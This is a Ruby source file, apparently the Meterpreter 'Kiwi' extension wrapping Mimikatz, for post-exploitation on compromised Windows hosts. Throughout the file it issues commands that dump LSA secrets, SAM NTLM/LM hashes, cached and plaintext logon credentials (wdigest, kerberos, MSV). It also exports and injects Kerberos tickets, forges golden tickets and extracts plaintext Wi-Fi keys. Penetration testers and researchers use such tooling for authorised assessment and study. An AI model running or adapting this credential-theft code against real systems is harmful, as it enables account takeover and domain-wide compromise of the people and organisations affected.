# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/kiwi/tlv'
require 'rexml/document'
require 'set'

module Rex
module Post
module Meterpreter
module Extensions
module Kiwi

###
#
# Kiwi extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by OJ Reeves (TheColonial)
###

class Kiwi < Extension

  #
  # These are constants that identify the type of credential to dump
  # from the target machine.
  #
  PWD_ID_SEK_ALLPASS   = 0
  PWD_ID_SEK_WDIGEST   = 1
  PWD_ID_SEK_MSV       = 2
  PWD_ID_SEK_KERBEROS  = 3
  PWD_ID_SEK_TSPKG     = 4
  PWD_ID_SEK_LIVESSP   = 5
  PWD_ID_SEK_SSP       = 6
  PWD_ID_SEK_DPAPI     = 7

  #
  # List of names which represent the flags that are part of the
  # dumped kerberos tickets. The order of these is important. Each
  # of them was pulled from the Mimikatz 2.0 source base.
  #
  KERBEROS_FLAGS = [
    "NAME CANONICALIZE",
    "<unknown>",
    "OK AS DELEGATE",
    "<unknown>",
    "HW AUTHENT",
    "PRE AUTHENT",
    "INITIAL",
    "RENEWABLE",
    "INVALID",
    "POSTDATED",
    "MAY POSTDATE",
    "PROXY",
    "PROXIABLE",
    "FORWARDED",
    "FORWARDABLE",
    "RESERVED"
  ].map(&:freeze).freeze

  #
  # Typical extension initialization routine.
  #
  # @param client (see Extension#initialize)
  def initialize(client)
    super(client, 'kiwi')

    client.register_extension_aliases(
      [
        {
          'name' => 'kiwi',
          'ext'  => self
        },
      ])
  end

  def exec_cmd(cmd)
    request = Packet.create_request('kiwi_exec_cmd')
    request.add_tlv(TLV_TYPE_KIWI_CMD, cmd)
    response = client.send_request(request)
    output = response.get_tlv_value(TLV_TYPE_KIWI_CMD_RESULT)
    output[output.index(cmd) + cmd.length + 1, output.length]
  end

  def lsa_dump_secrets
    exec_cmd('lsadump::secrets')
  end

  def lsa_dump_sam
    exec_cmd('lsadump::sam')
  end

  def lsa_dump_cache
    exec_cmd('lsadump::cache')
  end

  def creds_msv
    { msv: parse_msv(exec_cmd('sekurlsa::msv')) }
  end

  def creds_wdigest
    { wdigest: parse_wdigest(exec_cmd('sekurlsa::wdigest')) }
  end

  def creds_kerberos
    { kerberos: parse_kerberos(exec_cmd('sekurlsa::kerberos')) }
  end

  def creds_all
    output = exec_cmd('sekurlsa::logonpasswords')
    {
      msv: parse_msv(output),
      wdigest: parse_wdigest(output),
      kerberos: parse_kerberos(output)
    }
  end

  def parse_wdigest(output)
    results = {}
    lines = output.lines

    while lines.length > 0 do
      line = lines.shift

      # search for an wdigest line
      next if line !~ /\swdigest\s:/

      line = lines.shift

      # are there interesting values?
      next if line.blank?

      # no, the next 3 lines should be interesting
      wdigest = {}
      3.times do
        k, v = read_value(line)
        wdigest[k.strip] = v if k
        line = lines.shift
      end

      if wdigest.length > 0
        results[wdigest.values.join('|')] = wdigest
      end
    end

    results.values
  end

  def parse_kerberos(output)
    results = {}
    lines = output.lines

    while lines.length > 0 do
      line = lines.shift

      # search for an kerberos line
      next if line !~ /\skerberos\s:/

      line = lines.shift

      # are there interesting values?
      next if line.blank?

      # no, the next 3 lines should be interesting
      kerberos = {}
      3.times do
        k, v = read_value(line)
        kerberos[k.strip] = v if k
        line = lines.shift
      end

      if kerberos.length > 0
        results[kerberos.values.join('|')] = kerberos
      end
    end

    results.values
  end

  def parse_msv(output)
    results = {}
    lines = output.lines

    while lines.length > 0 do
      line = lines.shift

      # search for an MSV line
      next if line !~ /\smsv\s:/

      line = lines.shift

      # loop until we find the 'Primary' entry
      while line !~ / Primary/ && !line.blank?
        line = lines.shift
      end

      # did we find something?
      next if line.blank?

      # the next 4 lines should be interesting
      msv = {}
      4.times do
        k, v = read_value(lines.shift)
        msv[k.strip] = v if k
      end

      if msv.length > 0
        results[msv.values.join('|')] = msv
      end
    end

    results.values
  end

  def read_value(line)
    if line =~ /\s*\*\s([^:]*):\s(.*)/
      return $1, $2
    end

    return nil, nil
  end

  #
  # Dump the LSA secrets from the target machine.
  #
  # @return [Hash<Symbol,Object>]
  def lsa_dump
    request = Packet.create_request('kiwi_lsa_dump_secrets')

    response = client.send_request(request)

    result = {
      :major    => response.get_tlv_value(TLV_TYPE_KIWI_LSA_VER_MAJ),
      :minor    => response.get_tlv_value(TLV_TYPE_KIWI_LSA_VER_MIN),
      :compname => response.get_tlv_value(TLV_TYPE_KIWI_LSA_COMPNAME),
      :syskey   => response.get_tlv_value(TLV_TYPE_KIWI_LSA_SYSKEY),
      :nt5key   => response.get_tlv_value(TLV_TYPE_KIWI_LSA_NT5KEY),
      :nt6keys  => [],
      :secrets  => [],
      :samkeys  => []
    }

    response.each(TLV_TYPE_KIWI_LSA_NT6KEY) do |k|
      result[:nt6keys] << {
        :id    => k.get_tlv_value(TLV_TYPE_KIWI_LSA_KEYID),
        :value => k.get_tlv_value(TLV_TYPE_KIWI_LSA_KEYVALUE)
      }
    end

    response.each(TLV_TYPE_KIWI_LSA_SECRET) do |s|
      result[:secrets] << {
        :name        => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_NAME),
        :service     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_SERV),
        :ntlm        => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_NTLM),
        :current     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_CURR),
        :current_raw => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_CURR_RAW),
        :old         => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD),
        :old_raw     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW)
      }
    end

    response.each(TLV_TYPE_KIWI_LSA_SAM) do |s|
      result[:samkeys] << {
        :rid       => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_RID),
        :user      => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_USER),
        :ntlm_hash => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_NTLMHASH),
        :lm_hash   => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_LMHASH)
      }
    end

    result
  end

  #
  # Convert a flag set to a list of string representations for the bit flags
  # that are set.
  #
  # @param flags [Fixnum] Integer bitmask of Kerberos token flags.
  #
  # @return [Array<String>] Names of all set flags in +flags+. See
  #   {KERBEROS_FLAGS}
  def to_kerberos_flag_list(flags)
    flags = flags >> 16
    results = []

    KERBEROS_FLAGS.each_with_index do |item, idx|
      if (flags & (1 << idx)) != 0
        results  << item
      end
    end

    results
  end

  #
  # List available kerberos tickets.
  #
  # @param export [Bool] Set to +true+ to export the content of each ticket
  #
  # @return [Array<Hash>]
  #
  def kerberos_ticket_list(export)
    export ||= false
    request = Packet.create_request('kiwi_kerberos_ticket_list')
    request.add_tlv(TLV_TYPE_KIWI_KERB_EXPORT, export)
    response = client.send_request(request)

    results = []

    response.each(TLV_TYPE_KIWI_KERB_TKT) do |t|
      results << {
        :enc_type     => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_ENCTYPE),
        :start        => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_START),
        :end          => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_END),
        :max_renew    => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_MAXRENEW),
        :server       => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_SERVERNAME),
        :server_realm => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_SERVERREALM),
        :client       => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_CLIENTNAME),
        :client_realm => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_CLIENTREALM),
        :flags        => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_FLAGS),
        :raw          => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
      }
    end

    results
  end

  #
  # Use the given ticket in the current session.
  #
  # @param ticket [String] Content of the Kerberos ticket to use.
  #
  # @return [void]
  #
  def kerberos_ticket_use(ticket)
    request = Packet.create_request('kiwi_kerberos_ticket_use')
    request.add_tlv(TLV_TYPE_KIWI_KERB_TKT_RAW, ticket, false, true)
    client.send_request(request)
    return true
  end

  #
  # Purge any Kerberos tickets that have been added to the current session.
  #
  # @return [void]
  #
  def kerberos_ticket_purge
    request = Packet.create_request('kiwi_kerberos_ticket_purge')
    client.send_request(request)
    return true
  end

  #
  # Create a new golden kerberos ticket on the target machine and return it.
  #
  # @param user [String] Name of the user to create the ticket for.
  # @param domain [String] Domain name.
  # @param sid [String] SID of the domain.
  # @param tgt [String] The kerberos ticket granting token.
  # @param id [Fixnum] ID of the user to grant the token for.
  # @param group_ids [Array<Fixnum>] IDs of the groups to assign to the user
  #
  # @return [String]
  #
  def golden_ticket_create(user, domain, sid, tgt, id = 0, group_ids = [])
    request = Packet.create_request('kiwi_kerberos_golden_ticket_create')
    request.add_tlv(TLV_TYPE_KIWI_GOLD_USER, user)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_DOMAIN, domain)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_SID, sid)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_TGT, tgt)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_USERID, id)

    group_ids.each do |g|
      request.add_tlv(TLV_TYPE_KIWI_GOLD_GROUPID, g)
    end

    response = client.send_request(request)
    return response.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
  end

  #
  # List all the wifi interfaces and the profiles associated
  # with them. Also show the raw text passwords for each.
  #
  # @return [Array<Hash>]
  def wifi_list
    request = Packet.create_request('kiwi_wifi_profile_list')

    response = client.send_request(request)

    results = []

    response.each(TLV_TYPE_KIWI_WIFI_INT) do |i|
      interface = {
        :guid     => Rex::Text::to_guid(i.get_tlv_value(TLV_TYPE_KIWI_WIFI_INT_GUID)),
        :desc     => i.get_tlv_value(TLV_TYPE_KIWI_WIFI_INT_DESC),
        :state    => i.get_tlv_value(TLV_TYPE_KIWI_WIFI_INT_STATE),
        :profiles => []
      }

      i.each(TLV_TYPE_KIWI_WIFI_PROFILE) do |p|

        xml = p.get_tlv_value(TLV_TYPE_KIWI_WIFI_PROFILE_XML)
        doc = REXML::Document.new(xml)
        profile = doc.elements['WLANProfile']

        interface[:profiles] << {
          :name        => p.get_tlv_value(TLV_TYPE_KIWI_WIFI_PROFILE_NAME),
          :auth        => profile.elements['MSM/security/authEncryption/authentication'].text,
          :key_type    => profile.elements['MSM/security/sharedKey/keyType'].text,
          :shared_key  => profile.elements['MSM/security/sharedKey/keyMaterial'].text
        }
      end

      results << interface
    end

    return results
  end

end

end; end; end; end; end

